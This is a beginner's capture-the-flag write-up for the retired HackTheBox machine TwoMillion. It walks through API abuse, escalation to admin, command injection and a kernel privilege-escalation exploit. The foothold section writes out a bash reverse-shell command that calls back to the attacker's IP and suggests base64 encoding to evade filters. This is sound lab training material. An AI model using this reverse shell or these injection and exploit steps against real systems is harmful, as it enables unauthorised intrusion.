Hello,

  My name is mreyer0339 and this is my first CTF writeup using retired machines on (https://app.hackthebox.com/). I am using OpenVPN to connect to HTB virtual machines on my Kali Linux machine.   

  I am currently certified with the following:  
  - CompTIA A+  
  - CompTIA Network+  
  - CompTIA Security+  
  - CompTIA PenTest+  
  - AWS Certified Cloud Practitioner  

  I hope to continue my red-team process learning through HTB and doing more writeups, as well as eventually working towards completing SecurityX & OCSP certification.  

  
# WRITEUP 

HTB Machine: TwoMillion  

 # ENUMERATION

Let's begin by `ping`ing the machine to ensure connectivity.  

![image](https://github.com/user-attachments/assets/a6aede84-cb42-4e54-a071-0052116a3b92)

Success!  

Now, lets add the IP to our `/etc/hosts` file (2million.htb)  

![image](https://github.com/user-attachments/assets/7abc96a0-3dc3-4503-a534-6b0f79e85d88)

Now lets perform an `nmap` scan (versioning, OS detection, top 100 ports)  

![image](https://github.com/user-attachments/assets/3bad473d-6a12-47f5-b1ab-8250581a6bf7)


Ports 22 (SSH) and 80 (HTTP) are open on a Linux device.  

I'll start by trying to see if I can `SSH` using root or admin without a password.  

![image](https://github.com/user-attachments/assets/a7786c71-ac18-4754-8cac-3f18144f7a9a)

Fail.

Let's try and access the web server on port 80 by navigating to `http://10.10.11.221` on my browser.  

![image](https://github.com/user-attachments/assets/a5998660-2fc8-4a15-91ed-32b1516ebacb)

We have access to the website. I see a "Join" & "Login" page. Let's start by navigating to the "Join" page and inspecting the source code.  

![image](https://github.com/user-attachments/assets/d5dabba3-d179-4ce3-a0be-46a9144fe9b7)

It looks like there is a function that submits a `POST` request to `/api/v1/invite/verify` which first checks if the request was successful and then stores it locally.  

I also see a script called `inviteapi.min.js`. Let's look at what it does.  

![image](https://github.com/user-attachments/assets/306c2c20-1a75-4151-810c-31952a4cf3de)

This is all garbled...  Lets run it through a javascript unpacker. I used one at (https://matthewfl.com/unPacker.html)  

![image](https://github.com/user-attachments/assets/9d713346-6bc0-4fb4-82ec-3f93d20fcc76)

Great. It looks like `inviteapi.min.js` has 2 functions: The first one looks almost the same as the previous one that verifies an invite code. The second one makes a `POST` request to `/api/v1/invite/how/to/generate`.  

Lets dig further into this by using the `curl` command.  

![image](https://github.com/user-attachments/assets/a42dcd1f-3278-4563-87ac-6b9272a88fc3)

I'm seeing some encrypted-looking data with a mentioned encryption type: ROT13 (as well as a nice little hint that it needs decrypting). 

I googled ROT13 because it was an encryption type i'm not familiar with and found this website: (https://rot13.com) which seems to allow for decryption. I pasted the encrypted string and decrypted.  

![image](https://github.com/user-attachments/assets/a91c3ee0-a817-443a-9954-6cd94a127c45)

Following the instructions, I made a `POST` request to the server.  

![image](https://github.com/user-attachments/assets/d330ada2-f455-4391-ba24-c3636d22f8b2)

This looks very similar to the previous output, but isn't encrypted anymore. It may be Base64 encoded (the giveaway is that its only ASCII characters and it ends with a "=").  

The next step would be to decode it.  

![image](https://github.com/user-attachments/assets/f688c32e-3ef9-467e-9e5c-396a7118c439)

Is that an invite code??? Looks like one. Let's test it.  

![image](https://github.com/user-attachments/assets/5eaf038b-8cc1-4f96-9363-08c5bce296ea)

Huzzah! I'll add some random credentials (U: random, E: random@2million.htb, P: random)  

Logging in with those credentials worked. I am brought to a home page with an interesting page: "Access"  

![image](https://github.com/user-attachments/assets/2996cac5-95e9-41a1-8ea6-e2a2b4f8d889)

![image](https://github.com/user-attachments/assets/38333781-fa25-4c9c-bf52-8adfad8148d6)

The page looks like it lets you regenerate a VPN file for HTB. There is also a button to download "Connection Pack". Let's initiate `BurpSuite` to see what it does. Here is the output:  

![image](https://github.com/user-attachments/assets/66446107-4f68-4527-b516-e2fff59f2f09)

It looks like it sends a `GET` request to `/api/v1/users/vpn/generate` and downloads the VPN.  

I want to test out the URL `/api` using `curl`.  

![image](https://github.com/user-attachments/assets/f58ac72e-744f-46f2-a67f-383e23aec9af)

Unauthorized (401). If I authenticate with my PHP session cookie from my browser it may work.  

![image](https://github.com/user-attachments/assets/7d3e4203-e7bc-4bb8-a1c2-be99ae24661b)

Yep. That did it. OK (200)  

Lets go a step further and request `/api/v1`.   

I start by trying `curl` but realize it needs to be cleaned up or else I'll get an aneurysm. I found that piping to `jq` makes it all really pretty :)  

![image](https://github.com/user-attachments/assets/0870920e-f7b1-4f5d-b4ee-367eebe573f6)

Lots of endpoints shown here. Interested in the admin ones.  

I'll check if im an admin first. I doubt it...  

![image](https://github.com/user-attachments/assets/dfc4686a-70ac-433b-a825-fbe515bd212c)

Negative.   

Let's next try the `/vpn/generate` endpoint.  

![image](https://github.com/user-attachments/assets/0dbbf4d9-ad30-47d4-b690-2a39ef6ca47a)

Unauthorized (401)  

On to the last one: `/settings/update`  

![image](https://github.com/user-attachments/assets/61e6de69-20e4-45ed-9a2d-3a4a9d184f8c)

Looks good. `OK (200)`. Weird that it says invalid content type...   

I know from my SecurityX studies that APIs typically talk using JSON, and this is confirmed by previous server response syntax.  

I'm going to retry this, setting the `Content-Type` header to JSON.  

![image](https://github.com/user-attachments/assets/71672c2d-e6bf-4037-8dcc-82d16d6f6a16)

Missing parameter: `email`

Let's add it and retry.  

![image](https://github.com/user-attachments/assets/1b473969-bbf1-4d62-b419-498f920432e9)

Still missing a parameter: `is_admin` 

One more time...  

![image](https://github.com/user-attachments/assets/347840c8-b90d-46fe-ba43-cb4782b5c1b2)

One more time...  

Gotta get my variables right.  

![image](https://github.com/user-attachments/assets/1f3a3f45-6f60-4aa1-a228-2880d2424e75)

Rechecking admin status by `curl`ing to the `/admin/auth` endpoint  

![image](https://github.com/user-attachments/assets/95f4bcbb-de36-4b49-8b31-815595c632a9)

I am an admin.  


# FOOTHOLD

Now that I have confirmed admin privileges, I want to go back and try the the `/vpn/generate` endpoint  

![image](https://github.com/user-attachments/assets/29969ead-7540-410c-bba8-1e31540ef8d0)

Missing a username.   

Let's add mine (random).  

![image](https://github.com/user-attachments/assets/c03aced5-76f8-4233-956d-148df36f25c2)

The VPN config was printed to screen. After doing some digging and consultation with ChatGPT, if a site lets users request or generate a VPN config (.ovpn file) it is likely that running a backend shell command to do this.  

I'm led to believe that this may be a vulnerability allowing for code injection (as long as there is insufficient sanitization or strong use of parameterized queries).  

I want to try injecting a command to see if it's vulnerable. Let's use `whoami`.  

![image](https://github.com/user-attachments/assets/a885fc39-c6d2-486e-a496-a4641db40215)

I got a successfull answer. This was vulnerable to command injection.  

Because of this, I want to start a `Netcat` listener on my machine (port 4444).  

![image](https://github.com/user-attachments/assets/4e32669e-aed7-4b04-bee9-57625e334b90)

I need to then choose a payload to send:   
1) use `grep tun0` to find my HTB VPN IP  
2) Create bash reverse shell:  `bash -i >& /dev/tcp/10.10.14.104/4444 0>&1`
   explanation:  
   - `-i`               --> interactive shell  
   - `'>&`              --> redirect stdout & stderr to [my listener]  
   - `0>&1`             --> redirect stdin to come from same place as stdout (allows both input/output to pass over TCP socket)  
3) I think that the reverse shell command should be Base64 encoded (as most command injections are) to avoid special character problems and also to bypass WAFs and Filters that actively scan for strings like this.   

![image](https://github.com/user-attachments/assets/8069663a-e4c7-45c7-931a-5f61abf69052)

The reverse shell worked. Here's the output:  

![image](https://github.com/user-attachments/assets/d0ab3b68-0542-4fc2-8bc5-1d151b7f7d28)



# LATERAL MOVEMENT

I used the `ls -la` command to show all visible and hidden files.  

![image](https://github.com/user-attachments/assets/8bc4b962-f168-4a70-9816-7d316064ccb6)

I found the hidden file ".env" (`.<filename>` indicates hidden file).  

I also found the file `user.txt` but don't have permission to access. I'll need to get admin.

![image](https://github.com/user-attachments/assets/ad8d01d0-e0af-455d-8b67-719baecfd9d4)

Here, I see an admin username/password.  

Looking at the `/etc/passwd` file, it is confirmed that "admin" is an active user.  

![image](https://github.com/user-attachments/assets/146bb2a3-9f2d-4add-8807-4d8bd84cdfea)

With this password, I will SSH with the "admin" credentials. (Let's hope the user is re-using his passwords across services).  

![image](https://github.com/user-attachments/assets/a8e310a1-a3fa-4032-897a-6148ad98815f)

I found our `user flag` in the `/home/admin` directory. Lets take a look! 

(FYI: THIS IS A PORTION OF THE FLAG. TO FIND THE WHOLE FLAG, DO THIS YOURSELF)

![image](https://github.com/user-attachments/assets/ea1fdf00-911d-45c5-9502-888af4943ace)


I investigate further, finding a file "admin" in `/var/mail`.  

![image](https://github.com/user-attachments/assets/117f8514-c38b-46d3-ad10-329a75c7ebee)



# PRIVILEGE ESCALATION

A google search of "OverlayFS / Fuse CVE" reveals CVE-2023-0386 exists on Linux_Kernel 5.11-5.15.91.  

Let's check the kernel version on this machine using `uname -a`

![image](https://github.com/user-attachments/assets/801702bb-dc48-4466-a7c5-15845632d3de)

Looks like the version is a vulnerable one. Let's find an exploit online.  

I found the following github repository with an exploit: https://github.com/sxlmnwb/CVE-2023-0386  

I'll clone the repo, compress it, and upload it to the vulnerable system.  

![image](https://github.com/user-attachments/assets/624da50f-460e-45a0-b96e-6befacc6489d)

![image](https://github.com/user-attachments/assets/e3d89916-f429-442b-867d-daf8976b4234)

![image](https://github.com/user-attachments/assets/c3f8fa4b-cbc7-428a-8855-c2a8aa6410b3)

I'll go back to the shell and unzip it.  

![image](https://github.com/user-attachments/assets/33587a36-4794-4857-929e-173b4da544bb)

The github instructions are as follows:  

1) start 2 terminals  
  2) in the first --> `./fuse ./ovlcap/lower ./gc`  
  3) in the second --> `./exp`  

![image](https://github.com/user-attachments/assets/d7f65fb9-4f02-4204-9e89-8efcc5ee9dbe)

Confirming root privileges...  

![image](https://github.com/user-attachments/assets/cb51cf5d-5891-4b5d-98bf-07c4660bb316)

Checking for files in root directory...  

![image](https://github.com/user-attachments/assets/ea1a2b2e-e44b-4165-b88b-f384c6d6c259)

`root.txt` holds our root flag.


(FYI: THIS IS A PORTION OF THE FLAG. TO FIND THE WHOLE FLAG, DO THIS YOURSELF)

![image](https://github.com/user-attachments/assets/c4858055-4cdf-488c-9e9a-bdd188f3b8f4)


#####################################################################################################root.txt shows us our root flag==> 

# POST EXPLOIT - ADDITIONAL FUN

Investigating `thank_you.json`  

![image](https://github.com/user-attachments/assets/06f7ca77-9438-4cf9-b22d-8aa99d010f21)

The JSON is URL-encoded. Lets open CyberChef, an online decoder, to decode.  

After URL-Decoding the string, we get more JSON, this time being Hex-encoded.   

![image](https://github.com/user-attachments/assets/068a3804-5ada-43c5-a418-d9ad0e7b9998)

We `Jq` (jason query) for `.data`, stripping away anything that isn't the raw code. We also have to drop the first and last bytes ("quotes").  

We then decode from Hex.  

![image](https://github.com/user-attachments/assets/acce75a1-5ee1-48c1-9ec1-b6bcabd9944f)

It looks like now we are seeing that the code is Base64 encoded, shows an ecryption key, and states the encryption XOR.  

Lets `Jq` for .data again, as well as dropping first and last bytes again.  

Then, we decode from Base64.  

![image](https://github.com/user-attachments/assets/4f0c3c2c-3d6b-4aaf-8551-29a185a975d5)

Now, we can XOR with the key "HackTheBox". After trying out different XOR representations, we see that using UTF8 turns our data into readable text.  

![image](https://github.com/user-attachments/assets/ca456ab9-e743-4089-aee3-1352c314cb49)




















# COMMENTS
Thanks for your patience while reading my writeup. This was a long one, especially for my first.   

During a few occasions I resorted to consulting with the guide. For example:  
  - Using the JavaScript unpacker tool to investigate the true function of `inviteapi.min.js`  
  - Knowing to use BurpSuite to specifically target the "connection pack" function of the web app  
  - Unsure about where in the curl command passed to `/api/v1/admin/vpn/generate` to insert a system command that would be parsed (and how someone would know to do so other than spending many hours trying in all locations)  
  - Never had practice with CyberChef for decoding. I initially tried burpsuite but got stuck due to lack of XOR decoding functions.  




